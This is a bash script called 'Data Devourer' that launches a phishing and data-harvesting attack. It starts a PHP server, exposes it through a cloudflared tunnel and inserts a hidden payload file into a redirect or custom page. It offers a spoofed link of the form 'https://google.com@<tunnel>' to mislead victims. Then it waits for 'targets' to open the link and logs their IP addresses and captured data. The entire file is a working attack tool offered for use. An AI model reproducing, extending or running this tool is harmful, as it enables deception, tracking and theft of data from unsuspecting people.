#!/bin/bash
# Data Devourer v1
# Created by XBEAST
# Github Link: https://github.com/XBEAST1

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n\e[1;31m▓█████▄  ▄▄▄     ▄▄▄█████▓ ▄▄▄         ▓█████▄ ▓█████ ██▒   █▓ ▒█████   █    ██  ██▀███  ▓█████  ██▀███  \n'
printf '▒██▀ ██▌▒████▄   ▓  ██▒ ▓▒▒████▄       ▒██▀ ██▌▓█   ▀▓██░   █▒▒██▒  ██▒ ██  ▓██▒▓██ ▒ ██▒▓█   ▀ ▓██ ▒ ██▒\n'
printf '░██   █▌▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄     ░██   █▌▒███   ▓██  █▒░▒██░  ██▒▓██  ▒██░▓██ ░▄█ ▒▒███   ▓██ ░▄█ ▒\n'
printf '░▓█▄   ▌░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██    ░▓█▄   ▌▒▓█  ▄  ▒██ █░░▒██   ██░▓▓█  ░██░▒██▀▀█▄  ▒▓█  ▄ ▒██▀▀█▄  \n'
printf '░▒████▓  ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒   ░▒████▓ ░▒████▒  ▒▀█░  ░ ████▓▒░▒▒█████▓ ░██▓ ▒██▒░▒████▒░██▓ ▒██▒\n'
printf ' ▒▒▓  ▒  ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░    ▒▒▓  ▒ ░░ ▒░ ░  ░ ▐░  ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒▓ ░▒▓░\n'
printf ' ░ ▒  ▒   ▒   ▒▒ ░   ░      ▒   ▒▒ ░    ░ ▒  ▒  ░ ░  ░  ░ ░░    ░ ▒ ▒░ ░░▒░ ░ ░   ░▒ ░ ▒░ ░ ░  ░  ░▒ ░ ▒░\n'
printf ' ░ ░  ░   ░   ▒    ░        ░   ▒       ░ ░  ░    ░       ░░  ░ ░ ░ ▒   ░░░ ░ ░   ░░   ░    ░     ░░   ░ \n'
printf '   ░          ░  ░              ░  ░      ░       ░  ░     ░      ░ ░     ░        ░        ░  ░   ░     \n'
printf '\e[1;31m ░                                      ░                 ░                                       \n'                                                                 
printf " \e[1;35m                   by XBEAST ~ Dive into the Abyss Cyber Chaos with Data Devourer's \e[0m \n"
printf " \e[1;92m                                                v1.1 \e[0m \n"
printf "\e[1;90m                               Github Link: https://github.com/XBEAST1\e[0m \n"
printf "\n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { 
        echo >&2 "I require php but it's not installed. Install it. Aborting."; 
        exit 1; 
    } 
}

stop() {
    checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    
    if [[ $checkcf == *'cloudflared'* ]]; then
        pkill -f -2 cloudflared > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
    fi
    
    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    cat ip.txt >> ./target_report/saved.ip.txt
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            catch_ip
            rm -rf ip.txt
            tail -f -n 110 ./target_report/data.txt
        fi
        sleep 0.5
    done 
}

cf_server() {
    if [[ -e ./system_files/cloudflared ]]; then
        echo ""
    else
        sudo apt install wget -y
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
        arch=$(uname -m)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O ./system_files/cloudflared > /dev/null 2>&1
        elif [[ "$arch" == *'aarch64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O ./system_files/cloudflared > /dev/null 2>&1
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O ./system_files/cloudflared > /dev/null 2>&1
        else
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O ./system_files/cloudflared > /dev/null 2>&1 
        fi
    fi

    chmod +x ./system_files/cloudflared
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
    rm ./system_files/cf.log > /dev/null 2>&1 &
    ./system_files/cloudflared tunnel -url 127.0.0.1:3333 --logfile ./system_files/cf.log > /dev/null 2>&1 &
    sleep 10
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "./system_files/cf.log")

    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
        exit 1
    else
        if [[ $option_choice == "Y" || $option_choice == "YES" ]]; then
            spoofed_link=$(echo "$link" | sed 's|^https://||')
            printf "\e[1;92m[\e[0m*\e[1;92m] Spoofed link:\e[0m\e[1;77m %s\e[0m https://$spoof_domain@$spoofed_link"
        else
            printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
        fi
    fi

    sed 's+forwarding_link+'$link'+g' ./system_files/template.php > index.php
    checkfound
}

choicedomain() {
while true; do
    read -p $'\n\e[1;93m Enter your domain.\n\e[1;90m e.g. google.com\n\e[1;90m e.g. facebook.com\n\n\e[1;35m ' spoof_domain
    if [ -z "$spoof_domain" ]; then
        echo -e "\e[1;91m Please enter a domain.\e[0m"
    elif [ -z "$spoof_domain" ] || [[ ! "$spoof_domain" =~ \.. ]]; then
        echo -e "\e\n[1;91m Please enter a valid domain.\e[0m"
    else
        break
    fi
done
}

method() {
    read -p $'\n\e[1;93m Which Method You Want To Use? \n\n\e[1;90m 1.URL Redirection\e[0m \n\n\e[1;90m 2.Custom Webpage \n\n\e[1;35m Your Choice: ' method_choice
    method_choice=$(echo "$method_choice" | tr '[:lower:]' '[:upper:]')

    if [[ $method_choice == "1" || $method_choice == "URL" || $method_choice == "URL REDIRECTION" || $method_choice == "URLREDIRECTION" || $method_choice == "REDIRECTION" ]]; then
        read -p $'\n\e[1;93m Enter your redirection URL.\n\e[1;90m e.g. https://www.google.com/\n\e[1;90m e.g. https://www.facebook.com/\n\n\e[1;92m ' redirection_url
        urlredirection
        cf_server
        sleep 1
    elif [[ $method_choice == "2" || $method_choice == "CUSTOM" || $method_choice == "CUSTOM WEBPAGE" || $method_choice == "CUSTOMWEBPAGE" || $method_choice == "WEBPAGE" ]]; then
        customwebpage
        cf_server
        sleep 1
    fi
}

datadevourer() {
    if [[ -e ./target_report/data.txt ]]; then
        rm -rf ./target_report/data.txt
        touch ./target_report/data.txt
    fi

    urlredirection() {
        sed -e '/x_payload/r ./system_files/payload' -e "s|x_redirect|<meta http-equiv=\"refresh\" content=\"0; url=$redirection_url\">|" ./system_files/redirect.html > index.html
    }
    customwebpage() {
        sed -e '/x_payload/r ./system_files/payload' index_template.html > index.html
    }

    default_choice_domain="N"
    read -p $'\n\e[1;93m Do you want to spoof domain? [Default is N] [Y/N]: \e[0m' option_choice
    option_choice="${option_choice:-${default_choice_domain}}"
    option_choice=$(echo "$option_choice" | tr '[:lower:]' '[:upper:]')

    if [[ $option_choice == "Y" || $option_choice == "YES" ]]; then
        choicedomain
        method
        sleep 1
    else
        method
        sleep 1
    fi
}

banner
dependencies
datadevourer